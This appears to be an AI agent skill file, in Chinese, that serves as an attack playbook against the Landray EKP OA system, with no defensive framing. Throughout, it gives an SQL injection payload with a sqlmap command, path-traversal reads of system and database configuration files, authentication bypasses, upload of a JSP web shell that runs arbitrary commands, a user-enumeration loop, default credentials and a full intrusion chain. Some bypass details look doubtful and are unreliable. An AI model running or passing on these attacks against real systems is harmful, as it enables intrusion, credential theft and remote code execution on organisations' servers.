---
name: 蓝凌oa攻击
description: Use when encountering 蓝凌ekp oa系统漏洞利用 - 认证绕过、sql注入、rce、信息泄露
---

# 蓝凌OA攻击

## Info

- **Domain**: oa
- **Tags**: oa, landray, ekp, enterprise, rce

## 攻击思路
```
系统识别 → 信息收集 → SQL注入/认证绕过 → 文件上传 → RCE获取
```

## 系统识别

| 特征 | 值 |
|------|-----|
| Title | 蓝凌OA |
| 路径 | /landray/, /ekp/ |
| Cookie | JSESSIONID, LtpaToken |

```bash
# 识别
curl http://target/landray/home.jsp
curl http://target/ekp/
grep -i "landray\|EKP\|蓝凌"
```

## 关键漏洞矩阵

| 漏洞类型 | 路径 | 影响 |
|----------|------|------|
| SQL注入 | /sys/search/search.jsp | 数据泄露 |
| 任意文件读取 | /km/review/kmReviewMain.do | 配置泄露 |
| 认证绕过 | /sys/login/login.jsp | 权限绕过 |
| 文件上传 | /sys/ui/attachment/attachment.do | RCE |
| SSRF | /sys/sso/sso.jsp | 内网访问 |

## SQL注入攻击

```bash
# 注入点: /landray/sys/search/search.jsp
POST /landray/sys/search/search.jsp
Content-Type: application/x-www-form-urlencoded

keyword=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

# sqlmap利用
sqlmap -u "http://target/landray/sys/search/search.jsp" \
  --data="keyword=1" \
  --dbms=mysql \
  --batch
```

## 任意文件读取

```bash
# 漏洞点: /landray/km/review/km_review_main/kmReviewMain.do
POST /landray/km/review/km_review_main/kmReviewMain.do
Content-Type: application/x-www-form-urlencoded

method=downloadAtt&fdId=../../../etc/passwd

# Windows
method=downloadAtt&fdId=../../../windows/win.ini

# 读取配置文件
method=downloadAtt&fdId=../../../landray/WEB-INF/classes/jdbc.properties
```

## 认证绕过

```bash
# Cookie注入绕过
Cookie: LtpaToken=../../../etc/passwd

# SSO绕过
GET /landray/sys/sso/sso.jsp?ticket=admin

# 空密码绕过
POST /landray/sys/login/login.jsp
un=admin&pw=
```

## 文件上传RCE

```bash
# 上传点: /landray/sys/ui/attachment/attachment.do
POST /landray/sys/ui/attachment/attachment.do
Content-Type: multipart/form-data

# 上传JSP WebShell
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# 上传路径
/landray/upload/shell.jsp
```

## 信息泄露

| 敏感文件 | 路径 |
|----------|------|
| Web配置 | /landray/WEB-INF/web.xml |
| 数据库配置 | /landray/WEB-INF/classes/jdbc.properties |
| 用户信息 | /landray/km/hr/hr_main/kmHrMain.do?method=view&fdId=1 |
| 系统信息 | /landray/sys/portal/portal.jsp |

```bash
# 获取数据库配置
curl http://target/landray/WEB-INF/classes/jdbc.properties

# 枚举用户
for i in $(seq 1 100); do
  curl "http://target/landray/km/hr/hr_main/kmHrMain.do?method=view&fdId=$i"
done
```

## 默认凭证

| 账户 | 密码 |
|------|------|
| admin | admin |
| system | system |
| landray | landray |

## 完整攻击链

```
1. 访问/landray/识别系统
2. 尝试默认凭证登录
3. 检测SQL注入获取数据
4. 利用任意文件读取获取配置
5. 文件上传获取WebShell
6. 提权获取系统权限
```

## 漏洞检测脚本

```bash
# 检测SQL注入
curl -d "keyword=1'" http://target/landray/sys/search/search.jsp

# 检测文件读取
curl "http://target/landray/km/review/km_review_main/kmReviewMain.do?method=downloadAtt&fdId=../../../etc/passwd"

# 检测默认凭证
curl -d "un=admin&pw=admin" http://target/landray/sys/login/login.jsp
```